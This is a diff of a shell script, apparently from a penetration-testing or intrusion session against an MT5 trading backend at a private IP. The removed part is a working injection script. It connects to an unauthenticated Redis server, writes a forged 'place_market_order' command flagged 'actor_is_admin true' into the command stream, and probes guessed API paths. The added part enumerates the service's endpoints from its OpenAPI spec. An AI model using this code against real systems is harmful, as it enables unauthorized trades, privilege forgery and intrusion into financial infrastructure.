@@ -1,41 +1,18 @@
-echo "=== INJECTION: пишем команду в Redis stream ==="
-python3 << 'RPY'
-import socket,time,json,uuid
-s=socket.socket();s.settimeout(6);s.connect(("192.168.3.121",6379))
-# Читаем формат существующих записей
-s.sendall(b"XRANGE mt5:commands:eaera-test - + COUNT 1\r\n")
-time.sleep(1)
-existing=s.recv(4000).decode(errors="replace")
-print("EXISTING:",existing[:300])
-# Инъекция: команда place_market_order с большим объёмом
-cmd_id=str(uuid.uuid4())
-payload=json.dumps({"login":99999,"server":"EAERA-TEST","symbol":"EURUSD","volume":0.01,"order_type":"buy","client_order_id":cmd_id,"stop_loss":None,"take_profit":None,"comment":"cxp-test"})
-fields=[
-  ("correlation_id",cmd_id),
-  ("command","place_market_order"),
-  ("payload",payload),
-  ("actor_id","1"),
-  ("server","EAERA-TEST"),
-  ("login","99999"),
-  ("actor_is_admin","true"),
-]
-# Формируем XADD
-cmd_str=f"XADD mt5:commands:eaera-test *"
-for k,v in fields:
-  cmd_str+=f' {k} "{v}"'
-s.sendall((cmd_str+"\r\n").encode())
-time.sleep(1)
-r=s.recv(200).decode(errors="replace")
-print("XADD:",r[:100])
-# Проверяем что записалось
-s.sendall(b"XLEN mt5:commands:eaera-test\r\n")
-time.sleep(1)
-print("XLEN:",s.recv(100))
-s.close()
-RPY
-echo "=== HTTP 8000 API paths (детально) ==="
-for p in /api/v1/health /api/v1/trade /api/v1/order /api/v1/status /docs /openapi.json /api-docs /swagger.json; do
-  R=$(timeout 4 wget -q -T 3 -O - "http://192.168.3.121:8000$p" 2>/dev/null | head -c 100)
-  [ -n "$R" ] && echo "8000$p: $R"
-done
-echo INJECT
+echo "=== OPENAPI SPEC ==="
+wget -q -T 10 -O /tmp/oapi.json "http://192.168.3.121:8000/openapi.json" 2>/dev/null
+python3 -c "
+import json
+d=json.load(open('/tmp/oapi.json'))
+print('TITLE:',d.get('info',{}).get('title',''))
+print('VERSION:',d.get('info',{}).get('version',''))
+print()
+for path,methods in d.get('paths',{}).items():
+    for m,spec in methods.items():
+        print(f'{m.upper():7s} {path} - {spec.get("summary",spec.get("description",""))[:60]}')
+print()
+print('SERVERS:',d.get('servers',[]))
+" 2>/dev/null
+echo "=== CMS ROOT ==="
+wget -q -T 5 -O - "http://192.168.3.121:8000/" 2>/dev/null | head -c 200
+echo
+echo OAPI
